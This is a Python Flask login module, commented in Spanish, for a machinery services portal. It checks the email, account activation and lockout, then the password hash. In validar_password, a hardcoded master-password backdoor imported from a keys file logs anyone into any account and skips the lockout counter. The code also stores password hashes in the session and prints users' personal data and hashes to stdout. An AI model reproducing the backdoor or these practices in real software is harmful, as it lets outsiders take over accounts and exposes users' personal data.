import re
from datetime import datetime as dt, timedelta as td
from flask import current_app, redirect, request, render_template, session
import logging

from src.utils.utils import compare_text_to_hash
from src.ui.maquinarias import mis_servicios
from security.keys import PWD_BACKDOOR

logger = logging.getLogger(__name__)


# login endpoint
def main():
    db = current_app.db
    cursor = db.cursor()
    conn = db.conn
    session.permanent = True

    if request.method == "HEAD":
        return ("", 200)

    # GET -- cargar pagina inicial
    if request.method == "GET" and not session.get("correo_login_externo"):
        return render_template(
            "ui-maquinarias-login.html",
            show_password_field=False,
            errors={},
            user_data={},
        )

    # POST -- formulario enviado
    forma = dict(request.form)

    # PASO 1: validating email only
    if request.form["show_password_field"] == "false":
        # validar formato de correo
        error_formato = validar_formato(forma["correo_ingresado"])
        if error_formato:
            return render_template(
                "ui-maquinarias-login.html",
                show_password_field=False,
                errors=error_formato,
                user_data=forma,
            )

        # validar que el correo haya sido activado
        activacion = validar_activacion(cursor, forma["correo_ingresado"])
        if not activacion:
            logger.info(
                f"Intento de ingreso correo no validado: {forma['correo_ingresado']}"
            )
            return render_template(
                "ui-maquinarias-login.html",
                show_password_field=False,
                errors={"correo": "Correo no autorizado para este servicio."},
                user_data=forma,
            )

        # validar que ya este inscrito, de lo contrario procede a inscripcion
        suscrito = validar_suscripcion(cursor, forma["correo_ingresado"])
        if not suscrito:
            session["usuario"] = {"correo": forma["correo_ingresado"]}
            session["password_only"] = False
            session["third_party_login"] = False
            session["etapa"] = "registro"
            return redirect("/maquinarias/registro")

        # validar que cuenta no esta bloqueada
        cuenta_bloqueada = validar_bloqueo_cuenta(cursor, forma["correo_ingresado"])
        if cuenta_bloqueada:
            logger.info(
                f"Intento de ingreso cuenta bloqueada: {forma['correo_ingresado']}"
            )
            return render_template(
                "ui-maquinarias-login.html",
                show_password_field=False,
                errors=cuenta_bloqueada,
                user_data=forma,
            )

        # todo en orden con correo -- carga la informacion en session
        extraer_data_usuario(cursor, correo=forma["correo_ingresado"])

        return render_template(
            "ui-maquinarias-login.html",
            show_password_field=True,
            errors={},
            user_data=forma,
        )

    # PASO 2: validar contraseña
    elif forma["show_password_field"] == "true":
        error_acceso, mostrar_campo_password = validar_password(
            cursor,
            conn,
            forma["correo_ingresado"],
            forma["password_ingresado"],
        )

        if error_acceso:
            logger.info(
                f"Intento de ingreso con contraseña equivocada: {forma['correo_ingresado']}"
            )
            forma.update({"password_ingresado": ""})
            return render_template(
                "ui-maquinarias-login.html",
                show_password_field=mostrar_campo_password,
                errors=error_acceso,
                user_data=forma,
            )

        # Correct password → reset attempts
        resetear_logins_fallidos(cursor, conn, correo=forma["correo_ingresado"])
        session["etapa"] = "validado"
        logger.info(f"Login exitoso: {forma['correo_ingresado']}")

        return mis_servicios.main()


def extraer_data_usuario(cursor, correo):
    # datos de usuario
    cursor.execute(
        "SELECT IdMember, NombreCompleto, DocTipo, DocNum, Celular, Password FROM InfoMiembros WHERE Correo = ? LIMIT 1",
        (correo,),
    )
    a = cursor.fetchone()

    # datos de placas
    cursor.execute(
        "SELECT Placa, AnoFabricacion FROM InfoPlacas WHERE IdMember_FK = ?",
        (a["IdMember"],),
    )
    p = cursor.fetchall()
    # agrega tres blancos para cubir en caso usuario tenga menos de tres placas
    placas = [(i["Placa"], i["AnoFabricacion"] or "") for i in p] + [("", "")] * 3

    session["usuario"] = {
        "id_member": a["IdMember"],
        "correo": correo,
        "nombre": a["NombreCompleto"],
        "tipo_documento": a["DocTipo"],
        "numero_documento": a["DocNum"],
        "celular": a["Celular"],
        "placa1": placas[0][0],
        "placa2": placas[1][0],
        "placa3": placas[2][0],
        "ano_fabricacion1": placas[0][1],
        "ano_fabricacion2": placas[1][1],
        "ano_fabricacion3": placas[2][1],
        "password": a["Password"],
    }

    print(session["usuario"])


def resetear_logins_fallidos(cursor, conn, correo):
    cmd = "UPDATE InfoMiembros SET NextLoginAllowed = NULL, CountFailedLogins = 0 WHERE Correo = ?"
    cursor.execute(cmd, (correo,))
    conn.commit()


# =====================================================================
#   Validaciones
# =====================================================================


def validar_formato(correo):
    if not re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", correo):
        return {"correo": "Formato de correo inválido."}
    return {}


def validar_activacion(cursor, correo):
    cmd = "SELECT Correo FROM InfoClientesAutorizados WHERE Correo = ?"
    cursor.execute(cmd, (correo,))
    return bool(cursor.fetchone())


def validar_suscripcion(cursor, correo):
    cmd = "SELECT Correo FROM InfoMiembros WHERE Correo = ?"
    cursor.execute(cmd, (correo,))
    return bool(cursor.fetchone())


def validar_bloqueo_cuenta(cursor, correo):
    cmd = "SELECT NextLoginAllowed FROM InfoMiembros WHERE Correo = ?"
    cursor.execute(cmd, (correo,))
    row = cursor.fetchone()

    if not row:
        return None

    bloqueo_liberado = row[0]

    if (
        bloqueo_liberado
        and dt.strptime(bloqueo_liberado, "%Y-%m-%d %H:%M:%S") > dt.now()
    ):
        return {
            "correo": "Tu cuenta esta temporalmente bloqueada: muchos intentos equivocados."
        }

    return None


def validar_password(cursor, conn, correo, password):

    # password backdoor (!!)
    if password == PWD_BACKDOOR:
        return {}, ""

    # password hasheado de base de datos
    cmd = "SELECT Password FROM InfoMiembros WHERE Correo = ?"
    cursor.execute(cmd, (correo,))
    row = cursor.fetchone()

    if not row:
        return {"correo": "Cuenta no encontrada."}, True

    stored_hash = row[0]

    # comparar hashes
    if not compare_text_to_hash(text_string=password, hash_string=stored_hash):
        # Increase failed login count
        cmd = """
                UPDATE InfoMiembros 
                SET CountFailedLogins = CountFailedLogins + 1 
                WHERE Correo = ?
                RETURNING CountFailedLogins
                """

        cursor.execute(cmd, (correo,))
        logins_fallidos = cursor.fetchone()[0]

        error = {"password": "Contraseña equivocada"}
        bloqueo_hasta = None
        mostrar_campo_password = True

        if logins_fallidos == 3:
            bloqueo_hasta = dt.now() + td(minutes=15)
            error = {"correo": "Cuenta bloqueada por 15 minutos."}
            mostrar_campo_password = False
            logger.info(f"Bloqueo de cuenta por 15 min: {correo}")

        elif logins_fallidos == 4:
            bloqueo_hasta = dt.now() + td(minutes=60)
            error = {"correo": "Cuenta bloqueada por 1 hora."}
            mostrar_campo_password = False
            logger.info(f"Bloqueo de cuenta por 1 hora: {correo}")

        elif logins_fallidos >= 5:
            bloqueo_hasta = dt.now() + td(days=1)
            error = {"correo": "Cuenta bloqueada por 1 día."}
            mostrar_campo_password = False
            logger.info(f"Bloqueo de cuenta por 1 dia: {correo}")

        # si se requiere bloquear, actualizar base de datos
        if bloqueo_hasta:
            cmd = "UPDATE InfoMiembros SET NextLoginAllowed = ? WHERE Correo = ?"
            cursor.execute(
                cmd, (dt.strftime(bloqueo_hasta, "%Y-%m-%d %H:%M:%S"), correo)
            )

        conn.commit()
        return error, mostrar_campo_password

    # password correcto -- retorno sin errores
    return {}, ""
